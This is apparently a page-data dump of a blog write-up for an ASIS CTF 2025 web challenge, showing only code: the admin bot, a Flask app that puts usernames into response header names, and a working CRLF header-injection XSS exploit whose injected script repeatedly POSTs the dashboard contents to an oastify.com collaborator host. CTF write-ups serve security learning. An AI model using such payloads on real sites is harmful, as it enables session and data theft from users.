@@ -1,0 +1,283 @@
+2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-c34937e356df3122.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-ede090a8310641a6.js"],""]
+3:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-c34937e356df3122.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-ede090a8310641a6.js"],"PostMeta"]
+4:"$Sreact.suspense"
+6:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-c34937e356df3122.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-ede090a8310641a6.js"],"LikeButton"]
+7:I[5613,[],""]
+9:I[31778,[],""]
+a:I[89806,["250","static/chunks/250-0ef8476c0fa8ee24.js","372","static/chunks/372-d4f6d8bcfbfafb52.js","993","static/chunks/app/(posts)/layout-e15e5287e741ad91.js"],""]
+b:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-9af8316721e2155d.js"],"GlobalProvider"]
+c:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-9af8316721e2155d.js"],""]
+8:["slug","25d/wp-asisctf-2025","c"]
+0:["laovm6XE1uYNajIaapiXb",[[["",{"children":["(posts)",{"children":[["slug","25d/wp-asisctf-2025","c"],{"children":["__PAGE__?{\"slug\":[\"25d\",\"wp-asisctf-2025\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":[["slug","25d/wp-asisctf-2025","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"ASIS CTF 2025 Writeup"}],["$","$L3",null,{"path":"/25d/wp-asisctf-2025/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}],["$","$L6",null,{"path":"/25d/wp-asisctf-2025/"}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/e79a2122734bb4c0.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","div",null,{"id":"post-layout","children":[["$","div",null,{"id":"main","className":"center-wrapper","children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nconst currentTheme = localStorage.getItem('theme');\nif (currentTheme !== 'light' && currentTheme !== 'dark') {\n    localStorage.setItem('theme', 'light');\n}\nif (localStorage.getItem('theme') === 'dark') {\n    document.documentElement.setAttribute('class', 'dark');\n} else {\n    document.documentElement.setAttribute('class', 'light');\n}\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/3bc7e8f21884ab46.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/17b3c4485edf7c41.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
+e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-c34937e356df3122.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-ede090a8310641a6.js"],""]
+13:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-c34937e356df3122.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-ede090a8310641a6.js"],""]
+f:T486,with sync_playwright() as p:
+    browser = p.chromium.launch(headless=True)
+    context = browser.new_context()
+    page = context.new_page()
+
+    try:
+        # Visit your URL first, to avoid any attack
+        print(f"[BOT] Visiting {url}")
+        sys.stdout.flush()
+        page.goto(url)
+        time.sleep(5)
+
+        # Register and log as admin
+        print("[BOT] Login & registering")
+        sys.stdout.flush()
+        page.goto(BOT_VISIT + '/register')
+        page.fill("input[name='username']", FLAG)
+        page.fill("input[name='password']", "password")
+        page.click("input[type='submit']")
+        time.sleep(1)
+        page.goto(BOT_VISIT + '/login')
+        page.fill("input[name='username']", FLAG)
+        page.fill("input[name='password']", "password")
+        page.click("input[type='submit']")
+        time.sleep(1)
+
+        # Do some admin stuff
+        print("[BOT] Admin stuff")
+        sys.stdout.flush()
+        time.sleep(5)
+    except Exception as e:
+        print(f"[BOT] Failed to visit {url}: {e}")
+        sys.stdout.flush()
+    print("[BOT] Finished")
+    sys.stdout.flush()
+    context.close()
+    browser.close()
+10:T1a4f,<span class="token keyword">with</span> sync_playwright<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">as</span> p<span class="token punctuation">:</span>
+    browser <span class="token operator">=</span> p<span class="token punctuation">.</span>chromium<span class="token punctuation">.</span>launch<span class="token punctuation">(</span>headless<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+    context <span class="token operator">=</span> browser<span class="token punctuation">.</span>new_context<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    page <span class="token operator">=</span> context<span class="token punctuation">.</span>new_page<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        <span class="token comment"># Visit your URL first, to avoid any attack</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[BOT] Visiting </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>url<span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># Register and log as admin</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[BOT] Login &amp; registering"</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>BOT_VISIT <span class="token operator">+</span> <span class="token string">'/register'</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='username']"</span><span class="token punctuation">,</span> FLAG<span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='password']"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token string">"input[type='submit']"</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>goto<span class="token punctuation">(</span>BOT_VISIT <span class="token operator">+</span> <span class="token string">'/login'</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='username']"</span><span class="token punctuation">,</span> FLAG<span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>fill<span class="token punctuation">(</span><span class="token string">"input[name='password']"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">)</span>
+        page<span class="token punctuation">.</span>click<span class="token punctuation">(</span><span class="token string">"input[type='submit']"</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+        <span class="token comment"># Do some admin stuff</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[BOT] Admin stuff"</span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
+    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[BOT] Failed to visit </span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
+        sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[BOT] Finished"</span><span class="token punctuation">)</span>
+    sys<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    context<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    browser<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+11:Tfd8,<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>after_request</span>
+<span class="token keyword">def</span> <span class="token function">add_csp_header</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'Content-Security-Policy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"default-src 'none'; style-src 'self';"</span>
+    <span class="token keyword">return</span> response
+
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">dashboard</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    user_id <span class="token operator">=</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"user_id"</span><span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token keyword">not</span> user_id<span class="token punctuation">:</span>
+        <span class="token keyword">return</span> <span class="token string">"User not logged"</span><span class="token punctuation">,</span> <span class="token number">400</span>
+
+    username <span class="token operator">=</span> <span class="token boolean">None</span>
+    <span class="token keyword">with</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>DB_NAME<span class="token punctuation">)</span> <span class="token keyword">as</span> conn<span class="token punctuation">:</span>
+        cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"SELECT username FROM users WHERE id = ?"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>user_id<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        user <span class="token operator">=</span> cur<span class="token punctuation">.</span>fetchone<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        username <span class="token operator">=</span> user<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">if</span> user <span class="token keyword">else</span> <span class="token boolean">None</span>
+
+    rendered <span class="token operator">=</span> render_template<span class="token punctuation">(</span><span class="token string">"dashboard.html"</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">)</span>
+    response <span class="token operator">=</span> make_response<span class="token punctuation">(</span>rendered<span class="token punctuation">)</span>
+    response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'X-User-'</span> <span class="token operator">+</span> username<span class="token punctuation">]</span> <span class="token operator">=</span> user_id
+
+    <span class="token comment"># Future logic for saving books of each user</span>
+    <span class="token comment"># ...</span>
+
+    <span class="token keyword">return</span> response
+12:T6eb,<span class="token keyword">import</span> requests
+<span class="token keyword">import</span> http<span class="token punctuation">.</span>client <span class="token keyword">as</span> http_client
+
+http_client<span class="token punctuation">.</span>HTTPConnection<span class="token punctuation">.</span>debuglevel <span class="token operator">=</span> <span class="token number">1</span>
+
+url <span class="token operator">=</span> <span class="token string">"http://127.0.0.1:5001"</span>
+username <span class="token operator">=</span> <span class="token triple-quoted-string string">"""1:1\r\n\r\n&lt;html>
+&lt;head>&lt;/head>
+&lt;body>&lt;script>
+    alert(0);
+&lt;/script>&lt;/body>
+&lt;/html>
+&lt;!--
+"""</span>
+
+resp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/dashboard-debug"</span></span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span>
+    <span class="token string">"username"</span><span class="token punctuation">:</span> username
+<span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"================================="</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+14:Ta5e,<span class="token function">setInterval</span><span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">const</span> resp <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"/dashboard"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">const</span> data <span class="token operator">=</span> <span class="token keyword">await</span> resp<span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">await</span> <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">"http://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>
+        <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">"POST"</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">headers</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token string-property property">"Content-Type"</span><span class="token operator">:</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>
+        <span class="token literal-property property">body</span><span class="token operator">:</span> <span class="token string">"data="</span><span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span><span class="token function">encodeURIComponent</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+15:T6e8,<html>
+<head></head>
+<body>
+<script>
+    let host = "web";
+    let username = "1:1\r\n\r\n";
+    username += `\x3chtml>
+\x3chead></head>
+\x3cbody>poc
+\x3cscript>
+setInterval(async function() {
+    const resp = await fetch("/dashboard");
+    const data = await resp.text();
+    await fetch("http://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "data=".concat(encodeURIComponent(data)),
+    });
+}, 500);
+\x3c/script>
+\x3c/body>
+\x3c/html>
+\x3c!--
+`.replace(/\n/g, "\r\n");
+
+    const createInput = (name, value) => {
+        const input = document.createElement("input");
+        input.type = "hidden";
+        input.name = name;
+        input.value = value;
+        return input;
+    };
+
+    setTimeout(() => {
+        console.log("register...");
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.target = "_blank";
+        form.action = `http://${host}/register`;
+        form.appendChild(createInput("username", username));
+        form.appendChild(createInput("password", "password"));
+        document.body.appendChild(form);
+        form.submit();
+    }, 1000);
+
+    setTimeout(() => {
+        console.log("login...");
+        const form = document.createElement("form");
+        form.method = "POST";
+        form.target = "_blank";
+        form.action = `http://${host}/login`;
+        form.appendChild(createInput("username", username));
+        form.appendChild(createInput("password", "password"));
+        document.body.appendChild(form);
+        form.submit();
+    }, 2500);
+
+    setTimeout(() => {
+        window.open(`http://${host}/dashboard`, "_blank");
+    }, 4000);
+</script>
+</body>
+</html>
+16:T2f7b,<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    <span class="token keyword">let</span> host <span class="token operator">=</span> <span class="token string">"web"</span><span class="token punctuation">;</span>
+    <span class="token keyword">let</span> username <span class="token operator">=</span> <span class="token string">"1:1\r\n\r\n"</span><span class="token punctuation">;</span>
+    username <span class="token operator">+=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">\x3chtml>
+\x3chead>&lt;/head>
+\x3cbody>poc
+\x3cscript>
+setInterval(async function() {
+    const resp = await fetch("/dashboard");
+    const data = await resp.text();
+    await fetch("http://cgwjem81pxsk12rybbujzcvir9x0lq9f.oastify.com", {
+        method: "POST",
+        headers: {"Content-Type": "application/x-www-form-urlencoded"},
+        body: "data=".concat(encodeURIComponent(data)),
+    });
+}, 500);
+\x3c/script>
+\x3c/body>
+\x3c/html>
+\x3c!--
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\n</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token keyword">const</span> <span class="token function-variable function">createInput</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">name<span class="token punctuation">,</span> value</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> input <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        input<span class="token punctuation">.</span>type <span class="token operator">=</span> <span class="token string">"hidden"</span><span class="token punctuation">;</span>
+        input<span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
+        input<span class="token punctuation">.</span>value <span class="token operator">=</span> value<span class="token punctuation">;</span>
+        <span class="token keyword">return</span> input<span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">;</span>
+
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"register..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"form"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">"POST"</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token string">"_blank"</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/register</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createInput</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createInput</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"login..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">"form"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">"POST"</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>target <span class="token operator">=</span> <span class="token string">"_blank"</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span>action <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/login</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createInput</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">,</span> username<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span><span class="token function">createInput</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">{</span>
+        window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">http://</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>host<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">/dashboard</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">,</span> <span class="token string">"_blank"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">4000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
+17:T7cd,<span class="token keyword">from</span> flask <span class="token keyword">import</span> <span class="token operator">*</span>
+
+app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"exp.html"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5099</span><span class="token punctuation">)</span>
